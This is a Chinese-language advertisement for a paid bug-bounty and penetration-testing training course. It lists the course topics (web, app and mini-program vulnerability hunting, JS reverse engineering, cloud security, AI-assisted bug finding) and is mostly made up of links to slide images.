![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/83b80b20dc489205.gif)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b22659ecda58cfd4.gif)

Part 01

第四期实战培训课表

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/7dc380eb71142904.gif)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/a20ad91029ff2707.png)

覆盖企业赏金SRC，众测赏金，Edusrc，cnvd和工作项目渗透挖掘。

内容方面主要是AI大模型赋能网络安全、AI自动化挖洞和逆向、Web挖洞、小程序挖洞、APP挖洞、JS逆向、云安全、护网培训、项目漏洞实战、前端vue路由渗透等内容。

你直接按照我这个课程路线走（送零基础），半年可以达到人家学生无指导情况下自学2–3年的效果，很多学生还在学C语言、学PHP、Java的时候，你已经步入实战搞赏金了。

下面都是一些课件内容。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/7bd81973b2012a02.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9ae762489c063ef0.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/6d0734f9959c5a3b.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5cadc9349fb5525b.webp)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/4463d51a5aafb2db.webp)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9e394fad4e5827f9.webp)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/678aa20eea125be5.png)

Part 02

零基础培训课表

END

有想法的朋友，欢迎来找我咨询！

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/177358ce2b2f6611.png)
![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b2b4d1b28aabf113.png)
